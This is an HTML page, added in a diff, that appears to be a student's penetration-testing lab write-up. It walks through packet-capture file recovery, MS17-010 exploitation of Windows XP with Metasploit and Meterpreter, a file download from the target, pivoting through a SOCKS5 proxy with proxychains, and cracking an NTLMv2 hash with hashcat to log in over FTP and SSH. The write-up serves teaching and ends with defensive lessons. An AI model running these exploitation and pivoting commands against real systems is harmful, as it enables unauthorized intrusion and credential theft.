@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Multi-Phase Penetration Testing Lab - PCAP Analysis, SMBv1 Exploitation, Network Pivoting &amp; Hash Cracking - Josh Farias">
+    <meta name="author" content="Joshua Farias">
+    <title>Penetration Testing Lab | Josh Farias</title>
+    <link rel="icon" type="image/png" href="https://www.joshfarias.com/images/favicon.png"/>
+    <link rel="preconnect" href="https://www.joshfarias.com" crossorigin>
+    <link rel="stylesheet" href="../styles.css">
+    <style>
+        /* ===== ARTICLE HERO ===== */
+        .article-hero {
+            position: relative;
+            padding: 48px 24px 40px;
+            text-align: center;
+        }
+        .article-hero::before {
+            content: ''; position: absolute; inset: 0;
+            background: radial-gradient(ellipse at 50% 100%, rgba(39, 201, 63, 0.06) 0%, transparent 55%);
+            pointer-events: none;
+        }
+        .back-link {
+            display: inline-flex; align-items: center; gap: 6px;
+            font-size: 0.75rem; color: #777; margin-bottom: 20px;
+            transition: color 0.2s;
+        }
+        .back-link:hover { color: #27c93f; }
+
+        .article-hero .tags {
+            display: flex; justify-content: center; flex-wrap: wrap;
+            gap: 8px; margin-bottom: 16px;
+        }
+        .tag {
+            padding: 4px 12px;
+            background: rgba(39, 201, 63, 0.08); border: 1px solid rgba(39, 201, 63, 0.2);
+            border-radius: 20px; font-size: 0.65rem; color: #27c93f;
+            letter-spacing: 0.5px;
+            transition: background 0.25s;
+        }
+        .tag:hover { background: rgba(39, 201, 63, 0.15); }
+        .tag-blue {
+            background: rgba(139, 233, 253, 0.06); border-color: rgba(139, 233, 253, 0.15);
+            color: #8be9fd;
+        }
+        .tag-blue:hover { background: rgba(139, 233, 253, 0.12); }
+        .tag-red {
+            background: rgba(255, 95, 86, 0.06); border-color: rgba(255, 95, 86, 0.15);
+            color: #ff5f56;
+        }
+        .tag-red:hover { background: rgba(255, 95, 86, 0.12); }
+        .tag-yellow {
+            background: rgba(255, 189, 46, 0.06); border-color: rgba(255, 189, 46, 0.15);
+            color: #ffbd2e;
+        }
+        .tag-yellow:hover { background: rgba(255, 189, 46, 0.12); }
+
+        .article-hero h1 {
+            font-size: 2rem; color: #fff; margin-bottom: 10px; letter-spacing: -0.5px;
+        }
+        .article-hero .subtitle {
+            font-size: 0.82rem; color: #999; max-width: 580px; margin: 0 auto;
+        }
+
+        /* ===== ARTICLE BODY ===== */
+        .article {
+            max-width: 780px; margin: 0 auto;
+            padding: 48px 24px 60px;
+        }
+
+        .article p {
+            color: #ccc; margin-bottom: 18px; font-size: 0.88rem;
+        }
+
+        .article h2 {
+            color: #fff; font-size: 1.3rem;
+            margin-top: 48px; margin-bottom: 18px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #2a2a2a;
+            position: relative;
+        }
+        .article h2::before {
+            content: '// ';
+            color: #27c93f;
+        }
+
+        .article h3 {
+            color: #e0e0e0; font-size: 1.05rem;
+            margin-top: 32px; margin-bottom: 14px;
+        }
+
+        .article strong, .article b { color: #fff; }
+
+        .article ul, .article ol {
+            padding-left: 24px; margin-bottom: 18px;
+        }
+        .article li {
+            color: #ccc; font-size: 0.88rem;
+            margin-bottom: 6px;
+        }
+
+        /* ===== CODE BLOCKS ===== */
+        .code-block {
+            background: #0d0d0d;
+            border: 1px solid #222;
+            border-radius: 8px;
+            margin: 16px 0 24px;
+            overflow: hidden;
+            transition: border-color 0.3s;
+        }
+        .code-block:hover {
+            border-color: #333;
+        }
+
+        .code-header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 8px 16px;
+            background: #181818;
+            border-bottom: 1px solid #222;
+        }
+
+        .code-header .file-label {
+            font-size: 0.68rem; color: #777; letter-spacing: 0.5px;
+        }
+
+        .code-header .copy-btn {
+            padding: 3px 12px; font-size: 0.65rem;
+            background: #222; color: #888; border: 1px solid #333;
+            border-radius: 4px; cursor: pointer; font-family: inherit;
+            transition: color 0.2s, border-color 0.2s, background 0.2s;
+        }
+        .code-header .copy-btn:hover { color: #fff; border-color: #555; background: #2a2a2a; }
+
+        .code-body {
+            padding: 16px 20px;
+            overflow-x: auto;
+            font-size: 0.82rem;
+            line-height: 1.8;
+        }
+
+        .code-body pre {
+            margin: 0;
+            padding: 0;
+        }
+
+        .code-body code {
+            font-family: 'Consolas', 'Courier New', monospace;
+            color: #f8f8f2;
+        }
+
+        .prompt { color: #ff5f56; }
+        .prompt-msf { color: #8be9fd; }
+        .prompt-meterpreter { color: #50fa7b; }
+        .comment { color: #6272a4; }
+        .output { color: #999; }
+        .success { color: #50fa7b; }
+        .warning { color: #ffbd2e; }
+        .vuln { color: #ff5f56; }
+
+        /* Inline code */
+        .article code {
+            background: #0d0d0d; color: #f8f8f2;
+            padding: 2px 7px; border-radius: 4px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.85em;
+        }
+
+        /* ===== INFO CALLOUT ===== */
+        .callout {
+            background: rgba(39, 201, 63, 0.04);
+            border: 1px solid #2a2a2a;
+            border-left: 3px solid #27c93f;
+            border-radius: 6px;
+            padding: 16px 20px;
+            margin: 20px 0 24px;
+        }
+        .callout p { margin-bottom: 0; font-size: 0.82rem; }
+        .callout-label {
+            font-size: 0.68rem; color: #27c93f;
+            text-transform: uppercase; letter-spacing: 1px;
+            margin-bottom: 6px; font-weight: bold;
+        }
+
+        .callout-warn {
+            border-left-color: #ffbd2e;
+            background: rgba(255, 189, 46, 0.03);
+        }
+        .callout-warn .callout-label { color: #ffbd2e; }
+
+        .callout-red {
+            border-left-color: #ff5f56;
+            background: rgba(255, 95, 86, 0.03);
+        }
+        .callout-red .callout-label { color: #ff5f56; }
+
+        /* ===== RESOURCES ===== */
+        .resources {
+            margin-top: 48px;
+            padding-top: 24px;
+            border-top: 1px solid #2a2a2a;
+        }
+        .resources h2 { margin-top: 0; }
+        .resources ul {
+            list-style: none; padding: 0;
+        }
+        .resources li {
+            padding: 8px 0;
+            font-size: 0.82rem;
+            transition: padding-left 0.2s;
+        }
+        .resources li::before {
+            content: '> ';
+            color: #27c93f;
+        }
+        .resources li:hover {
+            padding-left: 4px;
+        }
+
+        /* ===== TABLE OF CONTENTS ===== */
+        .toc {
+            background: #222; border: 1px solid #2e2e2e;
+            border-radius: 8px; padding: 20px 24px;
+            margin-bottom: 36px;
+            transition: border-color 0.3s;
+        }
+        .toc:hover { border-color: #3a3a3a; }
+        .toc h3 {
+            font-size: 0.82rem; color: #fff; margin-bottom: 12px;
+        }
+        .toc ol {
+            padding-left: 20px; counter-reset: toc;
+            list-style: none;
+        }
+        .toc li {
+            counter-increment: toc;
+            padding: 4px 0; font-size: 0.78rem;
+        }
+        .toc li::before {
+            content: counter(toc) ". ";
+            color: #27c93f; font-weight: bold;
+        }
+        .toc a { color: #aaa; transition: color 0.2s; }
+        .toc a:hover { color: #27c93f; }
+
+        /* ===== NETWORK TOPOLOGY TABLE ===== */
+        .topology-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 16px 0 24px;
+            font-size: 0.82rem;
+        }
+        .topology-table th,
+        .topology-table td {
+            padding: 10px 14px;
+            text-align: left;
+            border: 1px solid #2a2a2a;
+        }
+        .topology-table th {
+            background: #181818;
+            color: #27c93f;
+            font-size: 0.72rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .topology-table td {
+            background: #0d0d0d;
+            color: #ccc;
+        }
+        .topology-table tr:hover td {
+            background: #141414;
+        }
+
+        /* ===== READING PROGRESS BAR ===== */
+        .reading-progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 2px;
+            background: #27c93f;
+            z-index: 150;
+            width: 0;
+            transition: width 0.1s linear;
+        }
+
+        /* ===== REDUCED MOTION ===== */
+        @media (prefers-reduced-motion: reduce) {
+            .reading-progress { transition: none; }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .article-hero h1 { font-size: 1.4rem; }
+            .article { padding: 32px 18px 48px; }
+            .code-body { font-size: 0.72rem; padding: 12px 14px; }
+            .topology-table { font-size: 0.72rem; }
+            .topology-table th, .topology-table td { padding: 8px 10px; }
+        }
+    </style>
+</head>
+<body>
+
+<a href="#article-content" class="skip-link">Skip to content</a>
+
+<!-- Reading progress bar -->
+<div class="reading-progress" id="readingProgress" aria-hidden="true"></div>
+
+<!-- ===== NAVBAR ===== -->
+<nav aria-label="Main navigation">
+    <div class="nav-inner">
+        <a href="../" class="nav-brand"><span>&gt;</span> joshfarias.com</a>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">&#9776;</button>
+        <ul class="nav-links" id="navLinks" role="list">
+            <li><a href="../">Home</a></li>
+            <li><a href="../projects" class="active">Projects</a></li>
+            <li><a href="../#about">About</a></li>
+            <li><a href="../#contact">Contact</a></li>
+        </ul>
+    </div>
+</nav>
+
+<!-- ===== ARTICLE HERO ===== -->
+<div class="article-hero">
+    <a href="../projects" class="back-link">&#8592; Back to Projects</a>
+    <div class="tags">
+        <span class="tag tag-red">Penetration Testing</span>
+        <span class="tag tag-red">Exploitation</span>
+        <span class="tag tag-blue">Networking</span>
+        <span class="tag tag-yellow">Forensics</span>
+    </div>
+    <h1>Multi-Phase Penetration Testing Lab</h1>
+    <p class="subtitle">PCAP analysis, SMBv1 exploitation, network pivoting via proxychains, and NTLMv2 hash cracking across a segmented lab environment.</p>
+</div>
+
+<hr class="divider" style="margin-top: 32px;">
+
+<!-- ===== ARTICLE ===== -->
+<article class="article" id="article-content">
+
+    <!-- Table of Contents -->
+    <div class="toc">
+        <h3>Table of Contents</h3>
+        <ol>
+            <li><a href="#overview">Overview</a></li>
+            <li><a href="#network-topology">Network Topology</a></li>
+            <li><a href="#phase-1">Phase 1: PCAP Analysis &amp; Insecure File Transfer</a></li>
+            <li><a href="#phase-2">Phase 2: Exploiting Windows XP SMBv1 (MS17-010)</a></li>
+            <li><a href="#phase-3">Phase 3: Network Pivoting, Proxychains &amp; Hash Cracking</a></li>
+            <li><a href="#key-findings">Key Findings &amp; Takeaways</a></li>
+            <li><a href="#resources">Resources</a></li>
+        </ol>
+    </div>
+
+    <!-- Overview -->
+    <section id="overview">
+        <p>This write-up documents a multi-phase penetration testing exercise conducted in a controlled lab environment. The engagement progressed through three phases: analyzing a packet capture to extract an insecurely transferred file, exploiting a critical SMBv1 vulnerability on a Windows XP target, and pivoting through the compromised host to reach a segmented network containing a second target running a web application.</p>
+
+        <p>The exercise covered core offensive security techniques including traffic analysis with Wireshark, file reconstruction from network captures, vulnerability scanning with Nmap, remote exploitation with Metasploit, post-exploitation enumeration, network pivoting with SOCKS5 proxies, web application source code inspection, NTLMv2 hash identification, and password cracking with Hashcat.</p>
+
+        <div class="callout">
+            <p class="callout-label">Context</p>
+            <p>This was conducted in an isolated virtual lab environment for educational purposes as part of a penetration testing course. All targets were purpose-built vulnerable machines. No real-world systems were targeted.</p>
+        </div>
+    </section>
+
+    <!-- Network Topology -->
+    <h2 id="network-topology">Network Topology</h2>
+
+    <p>The lab consisted of three machines across two segmented subnets. The attacker machine could only directly reach Target 1. Target 2 was isolated on a separate subnet, reachable only through Target 1 which was dual-homed across both networks.</p>
+
+    <table class="topology-table">
+        <thead>
+            <tr>
+                <th>Machine</th>
+                <th>Role</th>
+                <th>OS</th>
+                <th>Network 1</th>
+                <th>Network 2</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><b>Kali Linux</b></td>
+                <td>Attacker</td>
+                <td>Kali Linux</td>
+                <td>192.168.56.3</td>
+                <td>&mdash;</td>
+            </tr>
+            <tr>
+                <td><b>Target 1</b></td>
+                <td>Pivot Host</td>
+                <td>Windows XP SP3</td>
+                <td>192.168.56.4</td>
+                <td>10.0.15.3</td>
+            </tr>
+            <tr>
+                <td><b>Target 2</b></td>
+                <td>Web App Server</td>
+                <td>Linux</td>
+                <td>&mdash;</td>
+                <td>10.0.15.4</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <img src="../images/pentestschema.jpg" alt="Network topology diagram showing Kali Linux attacker at 192.168.56.3 connected through Network 1 to Target 1 (Windows XP SP3, dual-homed at 192.168.56.4 and 10.0.15.3), which bridges to Network 2 where Target 2 (Linux web app) sits at 10.0.15.4" loading="lazy" style="width: 100%; max-width: 780px; border-radius: 8px; border: 1px solid #2a2a2a; margin: 16px 0 24px;">
+
+    <p>Target 1 served as the bridge between the two subnets. After compromising it, the attacker could route traffic through it to reach Target 2 on the 10.0.15.0/24 network&mdash;a classic pivot scenario.</p>
+
+    <!-- Phase 1 -->
+    <h2 id="phase-1">Phase 1: PCAP Analysis &amp; Insecure File Transfer</h2>
+
+    <p>The first phase involved analyzing a provided PCAP file (<code>sec431Stage1FinalExam.pcapng</code>) to extract information hidden in a file that had been transferred insecurely over the network.</p>
+
+    <h3>Filtering for FTP Traffic</h3>
+
+    <p>The PCAP was opened in Wireshark and filtered for <code>ftp-data</code>. This revealed a GIF file (<code>sec431FA23FinalExam_phase1.gif</code>) being transferred via unencrypted FTP between 192.168.3.10 and 192.168.3.13.</p>
+
+    <div class="callout callout-warn">
+        <p class="callout-label">Security Issue</p>
+        <p>FTP transmits data in plaintext with no encryption. Any file transferred via FTP can be fully reconstructed by anyone capturing the network traffic. This is why protocols like SFTP or SCP should always be used instead.</p>
+    </div>
+
+    <h3>Reconstructing the File</h3>
+
+    <p>Since FTP provides no encryption, the transferred file was reconstructed by following the TCP stream of any packet referencing the <code>.gif</code> file in Wireshark. The stream data was exported as raw bytes and saved with a <code>.gif</code> extension.</p>
+
+    <h3>Verifying File Integrity</h3>
+
+    <p>The reconstructed file was examined in <b>HxD</b> (hex editor) and <b>Autopsy</b> (forensic tool) to verify the file header matched the GIF89a magic bytes, confirming it was a valid GIF and that nothing was obfuscated within the file structure.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">GIF File Header (Hex)</span>
+        </div>
+        <div class="code-body"><pre><code><span class="comment"># Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F</span>
+<span class="output">00000000   47 49 46 38 39 61 7E 07 48 00 70 00 00 2C 00 00</span>
+<span class="comment"># Decoded:  G  I  F  8  9  a  ~  .  H  .  p  .  .  ,  .  .</span>
+<span class="comment"># MIME Type: image/gif</span></code></pre></div>
+    </div>
+
+    <h3>Extracting the Barcode</h3>
+
+    <p>The GIF was analyzed in image editing software and confirmed to contain only a single frame&mdash;a barcode. The barcode was scanned using an online barcode reader and identified as a <b>Code128</b> barcode that decoded to a Google Drive link containing the instructions for Phase 2.</p>
+
+    <!-- Phase 2 -->
+    <h2 id="phase-2">Phase 2: Exploiting Windows XP SMBv1 (MS17-010)</h2>
+
+    <p>With the lab VMs configured, the next phase focused on identifying and exploiting a vulnerability on Target 1 (Windows XP SP3) to gain remote access and exfiltrate a file from the system.</p>
+
+    <h3>Network Scanning &amp; Enumeration</h3>
+
+    <p>An Nmap scan with service detection was run against the 192.168.56.0/24 subnet to identify live hosts and open ports.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Nmap Service Scan</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt">root@kali#</span> nmap -sV -Pn 192.168.56.0/24</code></pre></div>
+    </div>
+
+    <p>The scan discovered a live host at <b>192.168.56.4</b> running Windows XP with the following open ports:</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Scan Results - 192.168.56.4</span>
+        </div>
+        <div class="code-body">
+    <pre><code><span class="output">PORT      STATE   SERVICE         VERSION
+139/tcp   open    netbios-ssn     Microsoft Windows netbios-ssn
+445/tcp   open    microsoft-ds    Microsoft Windows XP microsoft-ds
+2869/tcp  closed  icslap
+3389/tcp  open    ms-wbt-server   Microsoft Terminal Services</span></code></pre>
+</div>
+    </div>
+
+    <h3>Vulnerability Scanning</h3>
+
+    <p>The Nmap <code>vulners</code> script was used for deeper vulnerability enumeration against the target.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Vulnerability Scan</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt">root@kali#</span> nmap -sV -script vuln -Pn 192.168.56.4</code></pre></div>
+    </div>
+
+    <div class="callout callout-red">
+        <p class="callout-label">Vulnerability Found</p>
+        <p><b>CVE-2017-0143 (MS17-010)</b> &mdash; Remote Code Execution vulnerability in Microsoft SMBv1 servers. Risk factor: <b>HIGH</b>. This is the same vulnerability exploited by the WannaCry ransomware. It allows an attacker to execute arbitrary code on the target system via a crafted SMB request to port 445.</p>
+    </div>
+
+    <h3>Exploitation with Metasploit</h3>
+
+    <p>The <code>ms17_010_psexec</code> module in Metasploit was selected to exploit the MS17-010 vulnerability and establish a Meterpreter session on the target.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Metasploit Configuration</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body">
+<pre><code><span class="prompt-msf">msf6 &gt;</span> use windows/smb/ms17_010_psexec
+<span class="prompt-msf">msf6 exploit(windows/smb/ms17_010_psexec) &gt;</span> set LHOST 192.168.56.3
+<span class="prompt-msf">msf6 exploit(windows/smb/ms17_010_psexec) &gt;</span> set RHOSTS 192.168.56.4
+<span class="prompt-msf">msf6 exploit(windows/smb/ms17_010_psexec) &gt;</span> exploit</code></pre>
+</div>
+    </div>
+
+    <p>The exploit completed successfully, establishing a <b>SYSTEM-level</b> Meterpreter session on the Windows XP target.</p>
+
+    <img src="../images/meterpreter.png" alt="Metasploit exploitation output showing successful MS17-010 exploit against 192.168.56.4, SYSTEM session obtained, and Meterpreter session 1 opened" loading="lazy" style="width: 100%; max-width: 780px; border-radius: 8px; border: 1px solid #2a2a2a; margin: 16px 0 24px;">
+
+    <h3>File Exfiltration</h3>
+
+    <p>With a Meterpreter shell established, the target file was located using the <code>search</code> command and downloaded to the attacker machine.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Locating &amp; Downloading the Target File</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt-meterpreter">meterpreter &gt;</span> search -f README_Stage3.txt
+<span class="output">Found 1 result...</span>
+<span class="output">c:\Documents and Settings\Administrator\Desktop\README_Stage3.txt</span>
+
+<span class="prompt-meterpreter">meterpreter &gt;</span> download "c:\Documents and Settings\Administrator\Desktop\README_Stage3.txt" /kali/Desktop/
+<span class="success">[*] Downloaded 1.51 KiB of 1.51 KiB (100.0%)</span></code></pre></div>
+    </div>
+
+    <p>The downloaded file contained instructions for Phase 3, confirming that Target 1 would be used as a pivot point to reach a second target on a different subnet.</p>
+
+    <!-- Phase 3 -->
+    <h2 id="phase-3">Phase 3: Network Pivoting, Proxychains &amp; Hash Cracking</h2>
+
+    <p>The final phase required using the compromised Windows XP system as a network pivot to access a second target on an isolated subnet, then performing web application analysis and credential cracking.</p>
+
+    <h3>Discovering the Second Network Interface</h3>
+
+    <p>From within the Meterpreter session, a system shell was spawned and <code>ipconfig</code> revealed a second network interface on the target.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Target 1 - Network Interfaces</span>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt-meterpreter">meterpreter &gt;</span> shell
+
+<span class="output">C:\WINDOWS\system32&gt;</span>ipconfig
+
+<span class="output">Ethernet adapter Local Area Connection:</span>
+<span class="output">   IP Address. . . . . . . . . . . . : 192.168.56.4</span>
+<span class="output">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span>
+
+<span class="output">Ethernet adapter Local Area Connection 2:</span>
+<span class="output">   IP Address. . . . . . . . . . . . : <b>10.0.15.3</b></span>
+<span class="output">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span></code></pre></div>
+    </div>
+
+    <p>The second adapter (10.0.15.3) placed Target 1 on the 10.0.15.0/24 subnet&mdash;a network the attacker could not reach directly.</p>
+
+    <h3>Setting Up the Pivot with Autoroute</h3>
+
+    <p>Metasploit's <code>autoroute</code> post-exploitation module was configured to route traffic destined for the 10.0.15.0/24 subnet through the existing Meterpreter session.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Autoroute Configuration</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt-msf">msf6 &gt;</span> use post/multi/manage/autoroute
+<span class="prompt-msf">msf6 post(multi/manage/autoroute) &gt;</span> set SESSION 1
+<span class="prompt-msf">msf6 post(multi/manage/autoroute) &gt;</span> run
+
+<span class="success">[+] Route added to subnet 192.168.56.0/255.255.255.0 from host's routing table.</span>
+<span class="output">[*] Post module execution completed</span>
+
+<span class="prompt-msf">msf6 post(multi/manage/autoroute) &gt;</span> route
+
+<span class="output">IPv4 Active Routing Table</span>
+<span class="output">========================</span>
+<span class="output">   Subnet         Netmask         Gateway</span>
+<span class="output">   ------         -------         -------</span>
+<span class="output">   10.0.15.0      255.255.255.0   Session 1</span>
+<span class="output">   192.168.56.0   255.255.255.0   Session 1</span></code></pre></div>
+    </div>
+
+    <h3>Configuring the SOCKS5 Proxy</h3>
+
+    <p>A SOCKS5 proxy was established using Metasploit's <code>server/socks_proxy</code> auxiliary module on port 1050 to allow external tools (Nmap, Firefox) to route through the pivot.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">SOCKS5 Proxy Setup</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt-msf">msf6 &gt;</span> use auxiliary/server/socks_proxy
+<span class="prompt-msf">msf6 auxiliary(server/socks_proxy) &gt;</span> set SRVPORT 1050
+<span class="prompt-msf">msf6 auxiliary(server/socks_proxy) &gt;</span> set VERSION 5
+<span class="prompt-msf">msf6 auxiliary(server/socks_proxy) &gt;</span> run
+
+<span class="output">[*] Auxiliary module running as background job 1.</span>
+<span class="success">[*] Starting the SOCKS proxy server</span></code></pre></div>
+    </div>
+
+    <p>The proxychains configuration file (<code>/etc/proxychains4.conf</code>) was updated to use the SOCKS5 proxy:</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">/etc/proxychains4.conf</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="comment">[ProxyList]</span>
+socks5 127.0.0.1 1050</code></pre></div>
+    </div>
+
+    <h3>Scanning the Second Subnet</h3>
+
+    <p>With the proxy chain active, Nmap was routed through proxychains to scan the 10.0.15.0/24 subnet using TCP connect scans (<code>-sT</code>), since the SOCKS5 proxy only supports TCP-based traffic.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Proxychained Nmap Scan</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt">root@kali#</span> proxychains nmap -sT -Pn 10.0.15.0-10
+
+<span class="output">[proxychains] Strict chain ... 127.0.0.1:1050 ... 10.0.15.4:21 ... OK</span>
+<span class="output">[proxychains] Strict chain ... 127.0.0.1:1050 ... 10.0.15.4:80 ... OK</span>
+
+<span class="output">Nmap scan report for 10.0.15.4</span>
+<span class="output">PORT   STATE SERVICE</span>
+<span class="output">21/tcp open  ftp</span>
+<span class="output">80/tcp open  http</span></code></pre></div>
+    </div>
+
+    <p>A host at <b>10.0.15.4</b> was discovered running FTP (port 21) and HTTP (port 80).</p>
+
+    <h3>Accessing the Web Application</h3>
+
+    <p>Firefox was configured to route through the SOCKS5 proxy (127.0.0.1:1050, SOCKS v5), allowing access to the web application at <code>http://10.0.15.4</code>. The page displayed a message indicating the final phase of the exercise.</p>
+
+    <h3>Discovering the NTLMv2 Hash</h3>
+
+    <p>Inspecting the HTML source code revealed a hashed string embedded as an HTML comment:</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">HTML Source - Hidden Hash</span>
+        </div>
+        <div class="code-body"><pre><code><span class="output">&lt;!--</span>
+<span class="vuln">kali::.:6ceeeed56521110d:A60F3E8B4BE92038433D54F8E0A304DB:0101000000...</span>
+<span class="output">--&gt;</span></code></pre></div>
+    </div>
+
+    <p>The hash was identified as <b>NTLMv2</b> based on its structure which follows the format: <code>username::domain:LM_hash:NTLM_hash:response_metadata</code></p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Hash Breakdown</span>
+        </div>
+        <div class="code-body"><pre><code><span class="comment"># Username:</span>     <span class="success">kali</span>
+<span class="comment"># Domain:</span>       <span class="output">.:</span>
+<span class="comment"># LM Hash:</span>      <span class="warning">6ceeeed56521110d</span>
+<span class="comment"># NTLM Hash:</span>    <span class="vuln">A60F3E8B4BE92038433D54F8E0A304DB</span>
+<span class="comment"># Response:</span>     <span class="output">010100000000000009D72D40B25DA01929...</span></code></pre></div>
+    </div>
+
+    <h3>Cracking the Hash with Hashcat</h3>
+
+    <p>The full hash was saved to a file and cracked using Hashcat with mode 5600 (NTLMv2) and the <code>rockyou.txt</code> wordlist.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">Hash Cracking</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt">root@kali#</span> hashcat -m 5600 -a 0 kali-hash.txt rockyou.txt
+<span class="output">hashcat (v6.2.6) starting...</span>
+
+<span class="prompt">root@kali#</span> hashcat -m 5600 -a 0 kali-hash.txt rockyou.txt --show
+<span class="output">KALI::.:6ceeeed56521110d:a60f3e8b4be92038433d54f8e0a304db:...</span>
+<span class="success">superman</span></code></pre></div>
+    </div>
+
+    <p>The cracked password was <b>"superman"</b>.</p>
+
+    <h3>FTP &amp; SSH Access via Proxychains</h3>
+
+    <p>The scope of the engagement permitted local logins on the network once a system was compromised. With the cracked credentials (<code>kali:superman</code>), a proxychained FTP session was established against Target 2.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">FTP Login via Proxychains</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt">root@kali#</span> proxychains ftp 10.0.15.4
+<span class="output">[proxychains] config file found: /etc/proxychains4.conf</span>
+<span class="output">[proxychains] Strict chain ... 127.0.0.1:1050 ... 10.0.15.4:21 ... OK</span>
+<span class="output">Connected to 10.0.15.4.</span>
+<span class="output">Name (10.0.15.4:root):</span> kali
+<span class="output">Password:</span>
+<span class="success">230 Login successful.</span>
+<span class="output">ftp&gt;</span></code></pre></div>
+    </div>
+
+    <p>With FTP access confirmed, the SSH service on Target 2 was opened and a proxychained SSH session was established from the attacker machine using the same credentials.</p>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="file-label">SSH Login via Proxychains</span>
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+        <div class="code-body"><pre><code><span class="prompt">root@kali#</span> proxychains ssh kali@10.0.15.4
+<span class="output">[proxychains] config file found: /etc/proxychains4.conf</span>
+<span class="output">[proxychains] Strict chain ... 127.0.0.1:1050 ... 10.0.15.4:22 ... OK</span>
+<span class="output">kali@10.0.15.4's password:</span>
+<span class="success">kali@target2:~$</span></code></pre></div>
+    </div>
+
+    <p>Both logins were successful, confirming the cracked credentials were valid and completing the final objective of the engagement.</p>
+
+    <!-- Key Findings -->
+    <h2 id="key-findings">Key Findings &amp; Takeaways</h2>
+
+    <p>The engagement revealed several vulnerabilities and misconfigurations across the lab environment:</p>
+
+    <ul>
+        <li><b>Insecure file transfers (FTP)</b> &mdash; Files transferred via plaintext FTP can be trivially intercepted and reconstructed from packet captures. Organizations should enforce SFTP, SCP, or other encrypted transfer protocols.</li>
+        <li><b>Unpatched critical vulnerabilities (MS17-010)</b> &mdash; The Windows XP system was vulnerable to CVE-2017-0143, a well-known remote code execution vulnerability in SMBv1. This flaw was exploited for full SYSTEM-level access. Legacy systems must be isolated and patched, or decommissioned entirely.</li>
+        <li><b>Insufficient network segmentation</b> &mdash; The dual-homed Target 1 bridged two subnets without proper access controls. Once compromised, it provided a direct route to the internal 10.0.15.0/24 network. Firewall rules and strict inter-VLAN ACLs should govern traffic between segments.</li>
+        <li><b>Sensitive data in HTML source</b> &mdash; An NTLMv2 hash was embedded in the web application's HTML as a comment. Credentials and hashes should never be stored in client-accessible resources.</li>
+        <li><b>Weak password</b> &mdash; The NTLMv2 hash was cracked in seconds using a common wordlist. Password policies should enforce complexity requirements and prohibit dictionary words.</li>
+    </ul>
+
+    <div class="callout">
+        <p class="callout-label">Tools Used</p>
+        <p>&bull; <b>Wireshark</b> (traffic analysis)</p>
+        <p>&bull; <b>HxD</b> (hex editor)</p>
+        <p>&bull; <b>Autopsy</b> (digital forensics)</p>
+        <p>&bull; <b>Nmap</b> (network scanning)</p>
+        <p>&bull; <b>Metasploit</b> (exploitation &amp; pivoting)</p>
+        <p>&bull; <b>Proxychains</b> (traffic routing)</p>
+        <p>&bull; <b>Hashcat</b> (password cracking)</p>
+        <p>&bull; <b>Inlite Research</b> (barcode reader)</p>
+    </div>
+
+    <!-- Resources -->
+    <div class="resources" id="resources">
+        <h2 style="margin-top: 0;">Resources</h2>
+        <ul>
+            <li><a href="https://www.cve.org/CVERecord?id=CVE-2017-0143" target="_blank" rel="noopener noreferrer">CVE-2017-0143 (MS17-010) - CVE Record</a></li>
+            <li><a href="https://nmap.org/book/nse.html" target="_blank" rel="noopener noreferrer">Nmap Scripting Engine Documentation</a></li>
